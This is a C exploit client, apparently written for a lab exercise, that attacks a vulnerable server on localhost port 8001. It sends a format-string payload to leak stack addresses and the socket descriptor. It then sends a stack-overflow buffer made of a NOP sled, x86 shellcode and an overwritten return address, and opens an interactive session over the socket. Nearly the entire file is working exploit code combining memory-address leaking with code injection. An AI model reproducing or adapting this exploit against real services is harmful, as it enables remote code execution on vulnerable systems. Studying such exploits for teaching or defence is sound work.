
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>
#include <fcntl.h>

#define	PORTNUM	8001
#define	BLENGTH	256

/* Extract informations from the string sent from read_command in the server composed of informations about the stack */
char *
stringToAddress(char *asciiAddr) {
	unsigned int integerAddr;
	char *addr = malloc(4); 

	/* strtoul because the addresse if greater than LONG_MAX */
	integerAddr = (unsigned int)strtoul(asciiAddr, NULL, 16);

	/* integerAddr is the address of response, getting address of answer */
	integerAddr += 256;
	printf("%lx\n", integerAddr); 
	addr = memcpy(addr, (char *)(&integerAddr), 4);

	return addr;
}

char **
strToWordtab(char *string, char *delimiter) {
	char **wordtab;
	char *token;
	size_t size = 0;
	unsigned int i = 0;

	wordtab = malloc(256);

	while ((token = strsep(&string, delimiter)) != NULL)
	{
		wordtab[i++] = token;
	}
	wordtab[i] = NULL;

	return wordtab;	
}


static void
exploit(int s)
{
	char **runtimeArray;
  	char buffer[BLENGTH];
	char *answerAddress;
	int socket;

	char shellcode[] =
	"\xeb\x13\x5e\x31\xc0\x31\xdb\x31"
	"\xc9\x31\xd2\xb3\x01\x89\xf1\xb2"
	"\x07\xb0\x04\xcd\x80\xe8\xe8\xff"
	"\xff\xff\x2f\x62\x69\x6e\x2f\x73"
	"\x68";

	/* Exploit snprintf vulnerability and get answer address */
  	recv(s, (void *)buffer, BLENGTH, 0);
	fputs(buffer, stdout);

	memset(buffer, '\0', BLENGTH);
	send(s, "%d %p %p %p %p %p %d %p %p\n", BLENGTH, 0);
  	recv(s, (void *)buffer, BLENGTH, 0);
	fputs(buffer, stdout);
	
	/* 7 = socket ; 9 = answer address,  */
	runtimeArray = strToWordtab(buffer, " ");	
	socket = strtol(runtimeArray[7], NULL, 10);
	answerAddress = runtimeArray[9];
	

	/* remove ; from answer address */

	answerAddress[strlen(answerAddress) - 1] = '\0';

	char *payloadAddress = stringToAddress(answerAddress);
	
	send(s, "1\n", 2, 0);
  	recv(s, (void *)buffer, BLENGTH, 0);
	fputs(buffer, stdout);

	/* clear anwser with NOP instruction */
	memset(buffer, '\x90', 128);

//	printf("buffer[i] : %d\n", buffer[0]);

	/* anwer[128] + x(4) + EBP(4) */

	strncpy(buffer, shellcode, strlen(shellcode));
	buffer[136] = payloadAddress[0];
	buffer[137] = payloadAddress[1];
	buffer[138] = payloadAddress[2];
	buffer[139] = payloadAddress[3];
	buffer[140] = '\0';

	/* TODO: Replace the occurence to the socket by the actual file descriptor of the socket */

	send(s, (void *)buffer, BLENGTH, 0);

	/* Set socket to nonblocking mode */
	int flags = fcntl(s, F_GETFL, 0);
	fcntl(s, F_SETFL, flags | O_NONBLOCK);

	size_t ret = 0;

	for (;;) {
		memset(buffer, '\0', BLENGTH);
		fgets(buffer, BLENGTH, stdin);
		send(s, buffer, BLENGTH, 0);
		
		sleep(1);
		do {
			ret = recv(s, buffer, BLENGTH, 0);
			fputs(buffer, stdout);			
		}
		while (ret != 0);		
	}	
}

int
main(void)
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;

  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }

  /* Server listening on localhost interface */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }

  /* Fill in socket address */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);

  /* Connect to server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }

  /* Talk to server */
  exploit(s);

  /* Close the socket */
  close(s);

  return (0);
}
